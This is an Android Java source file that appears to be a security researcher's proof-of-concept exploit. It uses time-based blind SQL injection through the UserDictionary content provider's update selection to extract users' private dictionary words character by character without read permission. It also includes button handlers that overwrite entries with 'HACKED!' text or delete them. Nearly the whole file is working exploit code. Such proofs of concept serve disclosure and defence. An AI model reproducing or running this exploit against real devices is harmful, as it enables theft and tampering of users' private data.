package com.ioactive.exploituserdictionary;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.DialogInterface;
import android.database.Cursor;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.UserDictionary;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.TextView;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends Activity {

    private static final double MIN_ACCURACY = 0.92;
    private static final int MIN_ITERATIONS = 10;
    private static final int MIN_THRESHOLD = 200;
    private static final int MAX_WORDS = 5;
    private static final int THREAD_PRIORITY = -20;

    private static final String TAG = "ExploitUserDictionary";

    private int mIterations = MIN_ITERATIONS;
    private int mTimeThreshold = MIN_THRESHOLD;

    private TextView mTextViewLog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        mTextViewLog = findViewById(R.id.textViewLog);
        mTextViewLog.setMovementMethod(new ScrollingMovementMethod());

        TextView textViewWords = findViewById(R.id.textViewWords);
        textViewWords.setMovementMethod(new ScrollingMovementMethod());

        stayAwake();

        attemptDirectQuery();
    }

    public void buttonStart_Click(View view) {
        findViewById(R.id.buttonStart).setEnabled(false);

        EditText editNumIterations = findViewById(R.id.editNumIterations);
        editNumIterations.setEnabled(false);
        mIterations = Integer.parseInt(editNumIterations.getText().toString());

        EditText editThreshold = findViewById(R.id.editThreshold);
        editThreshold.setEnabled(false);
        mTimeThreshold = Integer.parseInt(editThreshold.getText().toString());

        new Thread(new Runnable() {
            public void run() {
                android.os.Process.setThreadPriority(THREAD_PRIORITY);

                try {
                    adjustIterations();
                    retrieveUserDictionaryData();
                } catch (Exception ex) {
                    Log.e(TAG, "Error", ex);
                    log("COULD NOT RETRIEVE ANY DATA. Is the dictionary empty?");
                }
            }
        }).start();
    }

    private int timeToExecute(int rowId, String sqlCondition) {
        ContentValues values = new ContentValues();
        String conditionId = "";

        if (rowId > 0) {
            conditionId = "_id=" + rowId;
            values.put(UserDictionary.Words._ID, rowId);
        } else {
            conditionId = "_id=(SELECT MIN(_id) FROM words)";
            values.put(UserDictionary.Words.FREQUENCY, 250);
        }

        String condition = conditionId + " AND (" + sqlCondition + ")";
        ContentResolver cr = getContentResolver();

        long time = 0;
        for (int i = 0; i < mIterations; i++) {
            long tStart = System.nanoTime();
            cr.update(UserDictionary.Words.CONTENT_URI, values, condition, null);
            long tEnd = System.nanoTime();
            time += tEnd - tStart;
        }

        return (int) (time / 1000000);
    }

    private boolean isTrueCondition(int rowId, String sqlCondition) {
        int time = timeToExecute(rowId, sqlCondition);
        boolean isTrue = (time > mTimeThreshold);

        log("  Id: " + rowId + "   " + sqlCondition + " --> " + (isTrue ? "T" : "F") + " (" + time + "ms)");
        return isTrue;
    }

    private boolean isTrueCondition(String sqlCondition) {
        return isTrueCondition(-1, sqlCondition);
    }

    private double testAccuracy(int iterations) {
        log("Testing current accuracy...");
        int guesses = 0;
        for (int i = 0; i < iterations; i++) {
            int v = i % 2;
            if (isTrueCondition(v + "=1") == (v == 1))
                guesses += 1;
        }

        log("Accuracy: " + (100 * guesses / iterations) + "%");
        return (double) guesses / iterations;
    }

    private void retrieveUserDictionaryData() {
        log("Retrieving number of words...");
        int count = binarySearch(-1, "(SELECT COUNT(*) FROM words)");
        log("Number of words found in user's dictionary: " + count);
        if (count < 0 || count > MAX_WORDS) {
            count = MAX_WORDS;
            log("Limiting extraction to the first " + MAX_WORDS + " words only.");
        }

        int rowId = -1;
        for (int i = 0; i < count; i++) {
            log("Retrieving next internal row identifier...");
            rowId = binarySearch(-1, "(SELECT MIN(_id) FROM words WHERE _id > " + rowId + ")");

            log("Finding string length for word " + rowId + " ...");
            int len = binarySearch(rowId, "length(word)");
            log("String length for word " + rowId + ": " + len);

            StringBuilder sb = new StringBuilder();
            for (int j = 1; j <= len; j++) {
                int c = binarySearch(rowId, "unicode(substr(word," + j + ",1))");
                String newChar = Character.toString((char) c);
                appendToWordsFound(newChar);
                sb.append(newChar);
                log("Word " + rowId + " char #" + j + " retrieved: " + newChar + "  (ASCII: " + c + ")");
            }
            log("WORD " + rowId + " RETRIEVED: " + sb.toString());
            appendToWordsFound("   ");
        }

        log("** FINISHED **");
    }

    public int binarySearch(int id, String sqlExpression) {
        for (int retries = 0; retries < 5; retries++) {
            int min = 0;
            int max = 255;
            int mid = 0;

            while (min + 1 < max) {
                mid = (int) Math.floor((double) (max + min) / 2);

                if (isTrueCondition(id, sqlExpression + ">" + mid))
                    min = mid;
                else
                    max = mid;
            }

            if ((mid == max) && isTrueCondition(id, sqlExpression + "=" + mid))
                return mid;
            else if (isTrueCondition(id, sqlExpression + "=" + (mid + 1))) // Extra check
                return mid + 1;

            log("  Inaccurate value. Retrying...");
        }
        log("  VALUE NOT FOUND!");
        return -1;
    }

    private int estimateTimeThreshold() {
        int n = 10;
        int avgTime = 0;

        for (int i = 0; i < n; i++) {
            avgTime += timeToExecute(-1, "1=1");
            avgTime += timeToExecute(-1, "1=0");
        }
        avgTime /= (2 * n);

        log("  Number of iterations: " + mIterations + "  Average time: " + avgTime);
        return avgTime;
    }

    private void adjustIterations() throws Exception {
        int minThreshold = Math.max(mTimeThreshold, MIN_THRESHOLD);

        log("Warming up. Ignoring first iterations...");
        testAccuracy(5);

        for (int i = 0; i < 6; i++) {
            mIterations = Math.max(mIterations, MIN_ITERATIONS);
            log("Adjusting number of iterations. Testing with " + mIterations + "...");
            mTimeThreshold = estimateTimeThreshold();
            log("Time threshold set to " + mTimeThreshold + "ms");

            if (mTimeThreshold > minThreshold && testAccuracy(20) >= MIN_ACCURACY)
                return;

            mIterations = (mIterations * minThreshold) / mTimeThreshold;
            mIterations *= 1.25 + (i * 0.1);
        }

        throw new Exception("Minimum accuracy not satisfied.");
    }

    private synchronized void log(final String text) {
        Log.d(TAG, text);

        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                mTextViewLog.append(text + "\n");
            }
        });
    }

    private synchronized void appendToWordsFound(final String text) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                TextView textViewWords = findViewById(R.id.textViewWords);
                textViewWords.append(text);
            }
        });
    }

    private void attemptDirectQuery() {
        try {
            log("Attempting to query the UserDictionary content provider directly...");
            Cursor c = getContentResolver().query(UserDictionary.Words.CONTENT_URI, null, null, null, null);
            int n = c.getCount();

            if (n > 0)
                log("Application has direct read access to the content provider (" + n +
                        "rows found). Running as root or in older versions?");
            else
                log("As expected, there is no access to query the content provider.");
        } catch (Exception ex) {
            Log.i(TAG, "Error querying content provider", ex);
        }
    }

    private void stayAwake() {
        try {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            PowerManager.WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
                    "ExploitUserDictionaryWakelock");

            wakeLock.setReferenceCounted(false);
            wakeLock.acquire(30 * 60 * 1000);
        } catch (Exception ex) {
            Log.w(TAG, "Error acquiring wake lock", ex);
        }
    }

    public void buttonUpdate_Click(View view) {
        DialogInterface.OnClickListener dialogClickListener = new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                if (which == DialogInterface.BUTTON_POSITIVE) {
                    ContentValues values = new ContentValues();
                    DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
                    values.put(UserDictionary.Words.WORD, "123 - HACKED! " + dateFormat.format(new Date()));
                    getContentResolver().update(UserDictionary.Words.CONTENT_URI, values, "word LIKE '123%'", null);
                }
            }
        };

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("OVERWRITE ENTRIES?");
        builder.setMessage("This action will overwrite all the dictionary custom entries starting with '123'. Are you sure?");
        builder.setNegativeButton("No", null);
        builder.setPositiveButton("Yes", dialogClickListener);
        builder.show();
    }

    public void buttonDelete_Click(View view) {
        DialogInterface.OnClickListener dialogClickListener = new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                if (which == DialogInterface.BUTTON_POSITIVE) {
                    getContentResolver().delete(UserDictionary.Words.CONTENT_URI, "word LIKE '123%'", null);
                }
            }
        };

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("DELETE ENTRIES?");
        builder.setMessage("This action will delete all the dictionary custom entries starting with '123'. Are you sure?");
        builder.setNegativeButton("No", null);
        builder.setPositiveButton("Yes", dialogClickListener);
        builder.show();
    }

}